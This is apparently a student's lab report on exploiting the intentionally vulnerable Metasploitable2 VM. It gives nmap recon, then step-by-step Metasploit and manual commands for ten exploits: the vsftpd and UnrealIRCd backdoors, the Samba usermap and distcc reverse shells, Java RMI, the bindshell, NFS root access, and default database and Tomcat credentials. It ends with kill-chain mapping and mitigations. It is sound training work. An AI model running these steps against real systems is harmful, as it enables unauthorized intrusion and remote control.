
# Metasploitable2 Exploitation Report

**Name:** Vera Baiden

**Index Number:** 7354523

**Date:** 2026-09-20

**Target IP:** 192.168.1.4

**Attacker OS / Tools:**  Kali Linux 2026.x, Metasploit Framework x.x, nmap x.x

---

## Reconnaissance Summary
Command: nmap -sV -sC -p- 192.168.1.4

Key findings (65505 closed, notable open ports):
PORT     SERVICE    VERSION
21/tcp   ftp        vsftpd 2.3.4 (anonymous login allowed)

22/tcp   ssh        OpenSSH 4.7p1 Debian

23/tcp   telnet     Linux telnetd

25/tcp   smtp       Postfix smtpd

53/tcp   domain     ISC BIND 9.4.2

80/tcp   http       Apache httpd 2.2.8 (Ubuntu)

111/tcp  rpcbind

139/445  netbios-ssn Samba smbd 3.X-4.X / 3.0.20-Debian

512-514  exec/login/shell (rsh/rlogin, no auth)

1099/tcp java-rmi   GNU Classpath grmiregistry

1524/tcp bindshell  "Metasploitable root shell"

2049/tcp nfs

3306/tcp mysql      MySQL 5.0.51a-3ubuntu5

3632/tcp distccd    v1 4.2.4

5432/tcp postgresql PostgreSQL 8.3.0-8.3.7

5900/tcp vnc        VNC (protocol 3.3)

6667/tcp irc        UnrealIRCd

8009/tcp ajp13      Apache Jserv

8180/tcp http       Apache Tomcat/Coyote 1.1




## Exploit 1:  "vsftpd 2.3.4 Backdoor"

- **Service / Port:**  FTP / 21
- **Vulnerability:** intentional backdoor in vsftpd 2.3.4 (CVE-2011-2523) 
- **Tool Used:** Metasploit — exploit/unix/ftp/vsftpd_234_backdoor
- **Why This Tool:** The vulnerability's trigger is a fixed and known byte sequence. Metasploit automates sending it and catching the resulting shell and saves us from manually crafting the FTP session and connecting to port 6200 ourselves
  
- **Steps:**
  1. msfconsole - lauches Metasploit
  2. search vsftpd - searches for the module    
  3. use exploit/uni/ftp/vsftpd_234_backdoor
  4. set RHOSTS 192.168.1.4 - sets the target
  5. show options - verifies options
  6. set LHOST 192.168.1.3 - necessary beacause this module version defaults to      a Meterpreter payload requiring a listener
  7. exploit - runs the exploit
  8. getuid - confirms root access
   
- **Evidence:** <path to screenshot, e.g. evidence/exploit1.png>
- 
- **Cyber Kill Chain Stage(s):** Reconnaissance - nmap identified the exact        vsftpd version( vsftpd2.3.4)
- Weaponization - selects the matching Metasploitable module
- Delivery - module connects and sends the crafted username to the FTP service
- Exploitation - backdoor triggers, spawning the listener
- Installation, C2 - Mererpreter session is established and gives remote controll

- **Outcome / Impact:** Full root shell on the target with no credentials required

---

## Exploit 2: UnrealIRCd 3.2.8.1 Backdoor

- **Service / Port:** IRC/6667
- **Vulnerability:** Trojanized UnrealIRCd 3.2.8.1
- **Tool Used:**  Metasploit — exploit/unix/irc/unreal_irc_3281_backdoor
- **Why This Tool:** The backdoor's activation string is afixed, undocumented sequence buried in the compromised source. Metasploit's module has this hardcoded and handles registering a fake IRC connection to deliver it which would be tedious to replicate manuallywith raw sockets/netcat
- **Steps:**
  1. search unrealircd
  2. use exploit/unix/irc/unreal_irc_3281_backdoor
  3. set RHOSTS 192.168.1.4
  4. set LHOST 192.168.1.3
- **Evidence:** evidence/exploit1
- **Cyber Kill Chain Stage(s):**  Reconnaissance - nmap identidied UnrealIRCd service on 6667
- Weaponization - selected matching module
- Delivery - module registered an IRC connection and sent the trigger line
- Exploitation - backdoor executed the embedded command
- Installation, C2 - Meterpreter session is established

- **Outcome / Impact:** Remote shell access on the target via the IRC service

## Exploit 3: Samba usermap_script RCE (port 139/445)

- **Service / Port:** SMB/139(Samba)
- **Vulnerability:** Samba 3.0.20-3.0.25rc3 username map script command injection (CVE-2007-2447)
- **Tool Used:** Metasploit — exploit/multi/samba/usermap_script
- **Why This Tool:** The injection requires a username string with specific shell metacharacters and syntax that the target's username map script config will pass through unsanitized. Metasploit's module handles the exact malformed login sequence and payload delivery which is fiddly to get right by hand via raw SMB/Samba clientcalls
- **Steps:**
  1. background - kept the exploit 2 Meterpreter session alive
  2. search samba usermap
  3. use exploit/multi/samba/usermap_script which defaulted to cmd/unix/reverse_netcat payload
  4. set RHOSTS 192.168.1.4
  5. set LHOST 192.168.1.3
  6. exploit - opens command shell session 2
  7. whoami / id 
      
- **Evidence:** evidence/exploit3.png>
- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance - nmap identified vulnerable Samba version 3.0.20-Debian
-  Weaponization - selected the matching command-injection module and configured the netcat reverse-she payload
-  Delivery - module sent the crafted malicious username to the SB service 
-  Exploitation - username map script executed the injection shell command  
-  Installation, C2 - reverse netcat shell connected back giving remote control
    
- **Outcome / Impact:** Remote command execution/shell access on the target via SMB


## Exploit 4: distcod Remote Code Execution

- **Service / Port:** distcc/3632
- **Vulnerability:** distccd (distributed compiler daemon) accepts and executes compilation requests from any client with no authentication by default
- **Tool Used:**  Metasploit — exploit/unix/misc/distcc_exec
- **Why This Tool:** distcc's wire protocol for submitting compile jobs is non-trivial to construct manually. Metasploit's module formats a valid distcc job request that smuggles a shell command as the "compilation," which would otherwise require reverse-engineering the distcc protocol by hand
- 
- **Steps:**
  1. search distcc
  2. use exploit/unix/misc/distcc_exec which defaulted to cmd/unix/reverse_bash
  3. set RHOSTS 192.168.1.4
  4. set LHOSTS 192.168.1.3
  5. exploit - first attempt failed(target's bash lacked/dev/tcp support(bad file descriptor errors.
  6. set PAYLOAD cmd/unix/reverse_perl - Perl reverse shell, since bash networking wasn't available
  7. set LPORT 4444
  8. exploit - command shell session opened
  9. whoami 
       
- **Evidence:**  evidence/exploit4.png
- **Cyber Kill Chain Stage(s):**  Reconnaissance - nmap identified distccd v1 on 3632
-  Weaponization - selected module, adapted payload after the default failed to match the target's available interpreters
-  Delivery - crafted distcc job request sent to the daemon
-  Exploitation - daemon executed the embedded Perl reverse shell command
-   Installation, C2 - shell session established
    
- **Outcome / Impact:** Remote command execution on the target 

## Exploit 5: Java RMI Registry RCE(port 1099)

- **Service / Port:** Java RMI/1099
- **Vulnerability:** Insecure default configuration of the Java RMI registry - remote clients can register and invoke arbitrary RMI objects leading to remote code execution when a machine class is loaded
- **Tool Used:**  Metasploit — exploit/multi/misc/java_rmi_server
- **Why This Tool:** Exploiting Java RMI requires implementing an RMI-compliant remote object handshake and serving a malicious Java class via HTTP for the target to load — Metasploit automates both the RMI protocol negotiation and hosting the payload JAR, which would otherwise require writing custom Java RMI client code
  
- **Steps:**
 1. search java_rmi
 2. use exploit/multi/misc/java_rmi_server (defaulted to Java Meterpreter reverse TCP payload)
 3. set RHOSTS 192.168.1.4
 4. set RPORT 1099
 5. set LHOST 192.168.1.3
 6. exploit - started a payload-hosting HTTP server, target's RMI registry called back and loaded the malicious class, Meterpreter session 4 opened
 7. Confirmed with getuid

- **Evidence:**  evidence/exploit5.png
- **Cyber Kill Chain Stage(s):** Reconnaissance - nmap identified GNU Classpath grmiregistry on 1099
- Weaponization - selected module, payload JAR prepared and hosted
-  Delivery - target's RMI service was tricked into fetching the payload JAR over HTTP
-  Exploitation - malicious class loaded and executed by the JVM 
-  Installation, C2 - Meterpreter session established
    
- **Outcome / Impact:** Full Meterpreter session on the target via the RMI service
  

## Exploit 6: the "ingreslock" root blindshell (port 1524)

- **Service / Port:** ingreslock / 1524
- **Vulnerability:** Pre-planted root shell backdoor baked into the Metasploitable2 image itself — a leftover unauthenticated listener, not a real-world CVE
- **Tool Used:** Manual — nc (netcat)
- **Why This Tool:** No exploitation is actually required — the port already has a live root shell bound to it; a Metasploit exploit module would be inappropriate since no vulnerability is being triggered, just a direct connection
- **Steps:**
    1. nc 192.168.1.4 1524
    2. Landed directly at root@metasploitable:/# prompt
    3. whoami - confirmed root
- **Evidence:** evidence/exploit6.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Installation, C2
    - Reconnaissance: nmap flagged the "Metasploitable root shell" service label on 1524.
    - Delivery: netcat connection made to the open port.
    - Installation/C2: interactive root shell obtained directly — no Weaponization or Exploitation stage applies since no vulnerability was triggered, just a connection to a pre-existing backdoor.
- **Outcome / Impact:** Immediate, unauthenticated root shell access



  ## Exploit 7: NFS no_root_squash Misconfiguration(port 2049)
- **Service / Port:** NFS / 2049
- **Vulnerability:** NFS export misconfigured with no_root_squash, exporting / to any client (*) — allows a remote root user to write files to the target filesystem as root instead of being mapped to an unprivileged user
- **Tool Used:** Manual — showmount, mount, standard filesystem commands
- **Why This Tool:** This is a configuration flaw, not a code vulnerability — standard NFS client tools are sufficient to mount the share and demonstrate root-owned file creation
- **Steps:**
    1. showmount -e 192.168.1.4 - confirmed / exported to * 
    2. mkdir /tmp/nfs_mount
    3. sudo mount -t nfs 192.168.1.4:/ /tmp/nfs_mount -o nolock
    4. ls -la /tmp/nfs_mount → confirmed mount succeeded, full target filesystem visible
    5. touch /tmp/nfs_mount/pwned_test - failed with Permission denied (top-level / not world-writable)
    6. sudo touch /tmp/nfs_mount/tmp/pwned_test - created as local root, using the target's world-writable /tmp
    7. ls -la /tmp/nfs_mount/tmp/pwned_test - confirmed file owned by root root on the remote system
- **Evidence:** evidence/exploit7.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Actions on Objectives
    - Reconnaissance: nmap identified NFS/rpcbind and showmount revealed the unrestricted export.
    - Weaponization/Delivery: mounting the misconfigured share as a local filesystem.
    - Exploitation: writing a root-owned file, demonstrating unauthorized privileged filesystem access.
    -Actions on Objectives: arbitrary read/write access to the entire target filesystem as root.
- **Outcome / Impact:** Arbitrary root-level read/write access to the target's entire filesystem via NFS


## Exploit 8: MySQL root with no password (port 3306)
- **Service / Port:** MySQL / 3306
- **Vulnerability:** MySQL configured with a blank/empty root password, allowing unauthenticated root-level database access from any host
- **Tool Used:** Manual — mysql CLI client
- **Why This Tool:** This is a credential misconfiguration, not a code-level vulnerability — the standard database client connecting with the (blank) default root credentials is sufficient
- **Steps:**
    1. mysql -h 192.168.1.4 -u root - failed with a TLS/SSL negotiation error (modern client defaults vs. ancient server)
    2. mysql -h 192.168.1.4 -u root --skip-ssl - connected successfully with no password prompt
    3. SELECT version();` - confirmed 5.0.51a-3ubuntu5
    4. SELECT user, host FROM mysql.user; → enumerated accounts (debian-sys-maint, guest, root — root accessible from host %, i.e. any host)
- **Evidence:** evidence/exploit8.png
- **Cyber Kill Chain Stage(s):** 
    - Reconnaissance: nmap identified MySQL 5.0.51a-3ubuntu5 on 3306.
    -  Delivery: direct authentication attempt with blank root password.
    -  Exploitation: server accepted unauthenticated root login.
    -  Actions on Objectives: enumerated the full user table, confirming access to read/modify all databases.
- **Outcome / Impact:** Full unauthenticated root access to the MySQL database server



  ## Exploit 9: PostgreSQL default credentials (pot 5432)
  
- **Service / Port:** PostgreSQL / 5432
- **Vulnerability:** PostgreSQL configured with the default/weak credential pair (postgres/postgres) for the superuser account.
- **Tool Used:** Manual — psql CLI client.
- **Why This Tool:** This is a credential weakness, not a code vulnerability — connecting with the well-known default password directly demonstrates the flaw.
- 
- **Steps:**
    1. psql -h 192.168.1.4 -U postgres
    2. Entered postgres at the password prompt
    3. Connected successfully to postgres=# prompt (server 8.3.1)
    4. SELECT version(); → confirmed PostgreSQL 8.3.1
    5. `SELECT usename, usesuper FROM pg_user WHERE usename = current_user; → confirmed `usesuper = t` (superuser)
- **Evidence:** evidence/exploit9.png
- **Cyber Kill Chain Stage(s):** 
    - Reconnaissance: nmap identified PostgreSQL DB 8.3.0-8.3.7 on 5432.
    -  Delivery: authentication attempt with default credentials.
    -  Exploitation: server accepted the weak default password.
    -  Actions on Objectives: confirmed superuser access, enabling full database read/write and potential OS-level command execution.
- **Outcome / Impact:** Full superuser access to the PostgreSQL database server


## Exploit 10: Tomcat manager default credentials - WAR shell upload (port 8180)

- **Service / Port:** HTTP(Tomcat Manager)/8180
- **Vulnerability:** Apache Tomcat Manager left with default credentials (tomcat/tomcat), allowing an authenticated user to deploy arbitrary WAR files containing Java code for remote code execution.
- **Tool Used:**  Metasploit — exploit/multi/http/tomcat_mgr_upload.
- **Why This Tool:** Manual exploitation requires packaging a valid WAR containing a JSP shell, handling session/CSRF tokens, authenticating, uploading via the manager's HTTP API, then triggering deployment — Metasploit automates the entire pipeline.
- 
- **Steps:**
  1. search tomcat_mgr
  2. use exploit/multi/http/tomcat_mgr_upload (defaulted to Java Meterpreter payload)
  3. set RHOSTS 192.168.1.4
  4. set RPORT 8180
  5. set HttpUsername tomcat
  6. set HttpPassword tomcat
  7. set LHOST 192.168.1.3
  8. exploit - retrieved session ID/CSRF token, uploaded and deployed a malicious WAR, executed it, auto-undeployed as cleanup, Meterpreter session opened
  9. getuid - confirmed (Server username: tomcat55)
  
- **Evidence:** evidence/exploit10.png
- **Cyber Kill Chain Stage(s):** Reconnaissance - nmap identified Apache Tomcat/Coyote JSP engine on 8180.
-  Weaponization - malicious WAR payload crafted.
-  Delivery - authenticated upload via Tomcat Manager's HTTP interface.
-  Exploitation -  WAR deployed and executed by the servlet container.
-  Installation, C2 - Meterpreter session established.

 **Outcome / Impact:** Remote code execution and interactive shell access via the web application server (as the tomcat55 service account)



## Kill Chain Coverage Summary

| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
|---|---|---|---|---|---|---|---|
1. vsftpd 2.3.4 Backdoor | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | |
2. UnrealIRCd 3.2.8.1 Backdoor | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | |
3. Samba usermap_script RCE | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | |
4. distccd Command Execution | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | |
5. Java RMI Registry RCE | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | |
6. "ingreslock" Root Bindshell | ✔ | | ✔ | | ✔ | ✔ | |
7. NFS no_root_squash | ✔ | ✔ | ✔ | ✔ | | | ✔ |
8. MySQL Root, No Password | ✔ | | ✔ | ✔ | | | ✔ |
9. PostgreSQL Default Creds | ✔ | | ✔ | ✔ | | | ✔ |
10. Tomcat Manager to WAR Shell | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | |


---

## Lessons Learned / Mitigations (optional but recommended)

- **vsftpd backdoor / UnrealIRCd backdoor:** Never download binaries or source from unverified mirrors; verify checksums/signatures against the official project before installation.
- **Samba usermap_script:** Patch to Samba >= 3.0.25rc4, or disable the `username map script` option unless strictly required.
- **distccd:** Never expose distccd to untrusted networks; bind it to localhost/internal build farms only, behind a firewall.

- **MySQL / PostgreSQL / Tomcat default credentials:** Change all default passwords immediately after installation; enforce strong password policies and disable remote root/superuser login where not required.
